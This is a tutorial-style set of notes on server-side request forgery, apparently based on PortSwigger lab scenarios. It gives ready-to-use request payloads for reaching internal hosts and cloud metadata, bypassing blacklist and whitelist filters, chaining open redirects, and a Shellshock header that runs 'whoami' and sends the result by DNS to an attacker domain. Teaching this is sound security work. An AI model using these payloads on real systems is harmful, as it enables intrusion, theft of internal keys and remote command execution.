# SSRF(Server Side Request Forgery)
## [REFERENCE](https://portswigger.net/web-security/ssrf)
---
## WHAT IS SSRF(Server Side Request Forgery) ?? #### 

   - Server-side request forgery (SSRF) is a web security vulnerability that allows an attacker to make fool of the server to make requests for an unintended location.

   - In a typical SSRF attack, the attacker make a connection to "Internal-only services" within the organization's infrastructure. 
     
   - In other cases, they may be able to force the server to connect to arbitrary external/internal systems, potentially leaking sensitive data such as authorization credentials, keys etc.

   - Inshort, In SSRF you make fool of server & extract data from the server or directly connect(RCE) to the server.


## WHERE DO YOU FIND SSRF ?? 

   - You can find a functionality/parameter `where application directly connect/communicate to the backend server`. 
   - PDF or XML or Documents ( This very most hidden feature )
   - Webhook
   - File upload
   - Proxy services
    
   
## BASIC EXAMPLE 
   - Consider you're testing a web-application where we get a request like this.
       
         POST /render/pdf HTTP/1.0
         Host: subdomain.target.com
         Content-Length: 118
         ...
         ...
         render=http://subdomain.target.com/render/pdf/?user=101011

   - Now from above request you can see that `render` parameter directly communicate to the backend.
     
   - So, you can change the parameter value to `localhost`,`127.1`,`169.254.169.254` ..etc to directly communicate with 
     internal systems. 
     
   - It's doesn't matter that application using cloud based services or their own infrastructure it self.

   - We can also test SSRF, if we found Open-redirects not necessarily but in some cases.

PAYLOADS : 
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---
#### ############## PRACTICAL TESTING ################ ###

### 1) BASIC SSRF AGAINST LOCAL SERVERS #

   1) Consider you're testing an E-commerce application that has a feature of check the stock of the particular product.
   2) And if the user check the stock the request look like ..

          POST /product/stock HTTP/2
          Host: subdomain.target.com
          Cookie: session=pfR0IZWRhpGEDJJtvgj68rOawJ7KPfp9
	      Content-Length: 107
	      ...
	      ...
	      stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1`
   
   3) So in the above request the `stockApi` parameter is checking the stock of the product by directly asking to backend server.
   4) Now, as an attacker we can change the value of `stockApi` to the legitimate internal server, such as  
       
    http://localhost/ 
    http://127.0.0.1/           // on different ports
    http://169.254.169.254/     //for AWS

  and the request look like this,
   
	      POST /product/stock HTTP/2
	      Host: subdomain.target.com
	      Cookie: session=pfR0IZWRhpGEDJJtvgj68rOawJ7KPfp9
	      Content-Length: 107
	      ...
	      ...
	      stockApi=http://localhost:8080/`
---
### 2) Basic SSRF against another back-end system #

   1) Consider an E-commerce application fetches stock of the product from internal hosts, and the request look like this

          POST /product/stock HTTP/2
          Host: subdomain.target.com
          Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
          Content-Length: 96
          ...
          ...
          stockApi=http://192.168.0.1:8080/product/stock/check?productId=2`

   2) we can use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 
      `8080` and the request look like this

          POST /product/stock HTTP/2
	      Host: subdomain.target.com
	      Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
          Content-Length: 96
          ...
          ...
          stockApi=http://192.168.0.x:8080/admin

   
   3) Now, as an attacker mindset we can bruteforce the interal ip to find admin panel in internal range.
   4) To get the correct internal IP we can bruteforce the value of `x` to the numbers from `1-255` , we can also do the same method with ports.
---
### SSRF with blacklist-based input filter # 

#### What is Blacklist ??
   - Blacklisting is a security technique that involves creating a list of known bad/malicious input to blocking or filtering out input that matches the items in the list.
 
1) Consider an E-commerce application fetches stock of the product from internal services, and the request look like this..

       POST /product/stock HTTP/2
       Host: subdomain.target.com
       Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
       Content-Length: 96
       ...
       ...
       stockApi=http://192.168.0.1:8080/product/stock/check?productId=2`

  2) Now, This time The developer has deployed some weak anti-SSRF defenses which we can bypass by using some of the bypass techniques/payloads.

    http://2130706433/       // 127.0.0.1
    http://2852039166/       // 169.254.169.254
    http://[::]           // 127.0.0.1
    http://0.0.0.0/          // locahost

 3) There are tons of bypassing techniques out there on github and other platforms, we need to apply them by see the behaviour of application.

4) So now if we have to access to internal secret_keys, request will look like this...
      
       POST /product/stock HTTP/2
       Host: subdomain.target.com
       Cookie: session=WAh9012TO9pIKXpFpR6ZPHUR9ko8ppAy
       Content-Length: 56
       ...
       ...
       stockApi=http://127.1/Secret_keys
---
### SSRF with Whitelist-based input filter # 

#### What is White-listing ??
   - Whitelisting is a security technique that involves creating a list of known good, safe input and only allowing input that matches the items in the list.

1) Consider an E-commerce application fetches stock of the product from internal services, and the request look like 
       this..

         POST /product/stock HTTP/2
         Host: subdomain.target.com
         Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
         Content-Length: 96
         ...
         ...
         stockApi=http://stock.weliketoshop.net/product/stock/check?productId=2

2) Now, in this case the the request will only process when the `stock.weliketoshop.net` is present in `stockApi` 
      parameter, if not then application will not accept it and gives an error. 
   
3) So, There are tons of methods to bypass this, for very basic we can frame the request like this ...

         POST /product/stock HTTP/2
         Host: subdomain.target.com
         Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
         Content-Length: 96
         ...
         ...
         stockApi=http://localhost%2523@stock.weliketoshop.net/api/admin_keys

4) In the above request the `#` is double url-encoded , so firstly the application check weather 
      `stock.weliketoshop.net` is present or not..!!, if yes then it will process the request futher
   
5) The `#` is comment the `stock.weliketoshop.net` and, `@` is append the remaining value to `localhost`, hence the
      final parameter look like this and then server will process it and respond the internal stuff.

         stockApi=http://localhost/api/admin_apikeys
 ---
### SSRF with filter bypass via open redirection vulnerability

1) Consider an E-commerce application fetches stock of the product from internal services, the request goes like..

   - 1- Fetching Stock from Backend                     

         POST /product/stock HTTP/2
         Host: subdomain.target.com
         Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
         Content-Length: 96
         ...
         ...
         stockApi=/product/stock/check/?productId=1&storeId=3

   - 2 - and at some point in the application, it is also vulnerable to "Open Redirect" , the request look like this
   
2) Vulnerable Open Redirect Request

       GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
       Host: subdomain.target.com
       Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
       Content-Length: 0

3) Now, in the 2nd request , the `path` parameter is vulnerable to open redirect, 
4) So , if we change the value of `StockApi` parameter(1st request) by the path of 2nd request , like this

       POST /product/stock HTTP/2
       Host: subdomain.target.com
       Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
       Content-Length: 96
       ...
       ...
       stockApi=/product/nextProduct?currentProductId=2&path=/product?productId=3

5) Now, we can play with `path` parameter coz it is vulnerable to open_redirect, the request look like this

       POST /product/stock HTTP/2
       Host: subdomain.target.com
       Cookie: session=Cbk1v0cQskhHLqkG19kybRHR2griby7p
       Content-Length: 96
       ...
       ...
       stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.24:8080/admin/keys/api_keys

 6) In the above request, Since the application is vulnerable to open-redirect the `path` parameter gives us the 
       content of internal stuff. 
---
## BLIND/OUT_OF_BAND SSRF #

   - Blind SSRF vulnerabilities arise when an application is vulnerable to SSRF, but the response from the back-end request is not returned in the application's front-end response.

## How to Find Blind_SSRF #
   
   - The most reliable way to detect blind SSRF is using out-of-band (OAST) techniques. This involves attempting to trigger an HTTP request to an external system that you(attacker) control, and monitoring for network interactions with that system
   
   - We can also use out-of-band techniques that is using Burp Collaborator.
---
### Blind SSRF with out-of-band detection

1) We can add some of the below HTTP headers to test for SSRF   
            
            Referer: 
            From: 
            X-Originating-IP: 
            X-Client-IP: 
            Contact: 
            X-Forwarded-For: 
            Client-IP: 
            True-Client-IP: 
            X-Real-IP: 
            CF-Connecting_IP: 
            Forwarded: for= ;by= ;host=

2) In the above HTTP Headers, We put our(attacker_controlled) host to test for the BLIND-SSRF.
3) We can also use Burp-collaborator-Client for this.
---
### Blind SSRF with Shellshock exploitation

   #### NOTE: `This BUG/Exploit is very OLD`, there is very less chances to get this in currently used web-servers. ######      

1) Consider an application fetches its products from backend services, and the request look like this..

       GET /product?productId=2 HTTP/2
       Host: subdomain.target.com
       Cookie: session=otq3FxCmKNEyM6TFLIV9zPRPxNg0x1T2
       User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87
       Referer: https://subdomain.target.com/path1/path2
   
 2) Now, if we found Blind/out_of_band SSRF through `referer` header , we can also test for shellshock exploitation 

   ##### About shell shock : https://blog.cloudflare.com/inside-shellshock/
   
3) So, now the the framed request like..

       GET /product?productId=2 HTTP/2
       Host: subdomain.target.com
       Cookie: session=otq3FxCmKNEyM6TFLIV9zPRPxNg0x1T2
       User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
       Referer: http://192.168.0.x:8080

4) In the above request , what it does is basically, the application fetches data from internal range i.e : 
      `192.168.0.x:8080` , we can bruteforce the `x`(internal range) from `1-255`

5) Then the `User-Agent` will process internally, so if we just replace the value of `User-Agent` , with our shellshock payload i..e : `() { :; }; /usr/bin/nslookup $(whoami).ATTACKER-DOMAIN`
   
6) Then it will ping the `ATTACKER-DOAMIN` along with the output of `whoami` from the Vulnerable webservers.
---
---
